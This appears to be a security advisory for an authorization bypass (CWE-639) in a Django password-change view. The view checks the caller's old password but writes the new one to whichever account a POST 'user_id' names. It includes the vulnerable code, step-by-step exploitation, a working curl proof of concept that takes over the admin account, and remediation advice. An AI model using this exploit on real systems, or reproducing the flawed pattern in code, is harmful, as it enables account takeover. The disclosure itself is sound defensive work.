# Description

The password-change branch of the account settings view trusts a `user_id` value taken from the POST body. The current-password check is performed against the logged-in user (`request.user`), but the new password is written to whichever user the `user_id` field points to. Any authenticated user can therefore replace the password of any other account, including the platform administrator (`id=1`), by supplying their own valid old password together with `user_id=1`.

**CWE-639: Authorization Bypass Through User-Controlled Key**

Vulnerable code (deployed source, `Account/views.py`):

```python
# Account/views.py:425-444
if 'old_password' in request.POST:                                   # line 425
    old = request.POST['old_password']                               # line 426
    new = request.POST['new_password']                               # line 427
    confirm = request.POST['confirm_password']                       # line 428

    user_id = request.POST.get('user_id', request.user.id)           # line 430  <-- attacker-controlled
    try:
        target_user = User.objects.get(id=user_id)                   # line 432  <-- lookup by POST value
    except User.DoesNotExist:
        target_user = request.user                                   # line 434

    if new != confirm:                                               # line 436
        messages.error(request, "New passwords do not match.")
    elif not request.user.check_password(old):                       # line 438  <-- checks attacker's own password
        messages.error(request, "Old password is incorrect.")
    else:
        target_user.set_password(new)                                # line 441  <-- writes victim's password
        target_user.save()                                           # line 442
        update_session_auth_hash(request, request.user)              # line 443
        messages.success(request, "Password updated successfully.")  # line 444
```

The authorization check (`request.user.check_password(old)`, line 438) validates the attacker's credentials, but the object that is modified (`target_user`, lines 432-442) is selected from the attacker-supplied `user_id`. No check ensures `target_user == request.user`. The safe default that already exists on line 430 (`request.user.id`) is only used when the parameter is absent, which the attacker simply avoids sending.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Register or use any existing low-privilege account (e.g. `johndoe`) and log in at `/account/login/`. | Session cookie for `johndoe` is issued. |
| 2 | Identify the target account ID. The administrator is conventionally `id=1` (the platform admin, also visible via the unauthenticated user-list API). | Target `user_id=1` is identified. |
| 3 | Load `/account/settings/` to obtain a valid `csrfmiddlewaretoken`. | Valid CSRF token is obtained for the session. |
| 4 | POST to `/account/settings/` with `old_password` set to johndoe's own current password, `new_password`/`confirm_password` set to the attacker-chosen value, and `user_id=1`. | View passes the `old_password` check (against johndoe), looks up user 1 via line 432, and calls `set_password()`/`save()` on user 1 (lines 441-442). Response is a 302 redirect with "Password updated successfully." |
| 5 | Log out, then log in at `/account/login/` as `admin` with the chosen new password. | Login succeeds as the administrator. Full platform takeover is achieved. |

# PoC

```bash
# Step 1: log in as the low-privilege attacker account (johndoe) and store cookies
curl -s -c john.cookies -b john.cookies http://localhost:8000/account/login/ -o login.html
CSRF=$(grep -oE 'csrfmiddlewaretoken" value="[^"]+' login.html | head -1 | cut -d'"' -f3)
curl -s -c john.cookies -b john.cookies -X POST http://localhost:8000/account/login/ \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "username=johndoe" \
  --data-urlencode "password=<johndoe_password>" \
  -H "Referer: http://localhost:8000/account/login/" -o /dev/null

# Step 2: fetch the settings page to obtain a CSRF token for this session
curl -s -c john.cookies -b john.cookies http://localhost:8000/account/settings/ -o settings.html
CSRF=$(grep -oE 'csrfmiddlewaretoken" value="[^"]+' settings.html | head -1 | cut -d'"' -f3)

# Step 3: change the ADMIN password (user_id=1) using johndoe's own old password
curl -s -i -c john.cookies -b john.cookies -X POST http://localhost:8000/account/settings/ \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "old_password=<johndoe_password>" \
  --data-urlencode "new_password=pwned" \
  --data-urlencode "confirm_password=pwned" \
  --data-urlencode "user_id=1" \
  -H "Referer: http://localhost:8000/account/settings/" | grep -E "^HTTP"
# Expected: HTTP/1.1 302 Found (admin password is now "pwned")

# Step 4: verify by logging in as admin with the new password
curl -s -i -X POST http://localhost:8000/account/login/ \
  --data-urlencode "username=admin" \
  --data-urlencode "password=pwned" | grep -E "^(HTTP|Location)"
```

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Full read access to all accounts, banking data, and admin-only views once the administrator session is obtained. |
| Integrity | Any account, including the administrator, can have its credentials replaced; attacker can alter balances, content, and platform configuration as admin. |
| Availability | Attacker can lock out legitimate administrators and other users by rewriting their passwords, or disable accounts from the admin panel. |

Overall severity: **Critical**. Exploitation requires only a single low-privilege account and knowledge of a victim ID (commonly `1`), with no victim interaction. The result is complete account takeover of the platform administrator, which can be chained into total compromise of every module.

# Remediation

1. Remove the `user_id` POST parameter entirely. Always operate on `request.user`: `target_user = request.user`, and never look up a user from request data in the password-change path.
2. Keep the current-password verification and the write on the same object (`request.user.check_password(old)` followed by `request.user.set_password(new)` and `request.user.save()`).
3. Add a defensive assertion so that any mismatch fails closed, for example `if target_user != request.user: raise PermissionDenied`.
4. Provide staff-driven password resets through a separate admin-only endpoint protected by `@user_passes_test(lambda u: u.is_superuser)` (or equivalent role checks), with its own audit logging, rather than overloading the self-service settings form.
5. Log and alert on password changes where the acting session and the affected account differ, and invalidate existing sessions for the affected account after any password change.

# Author
WOCSA
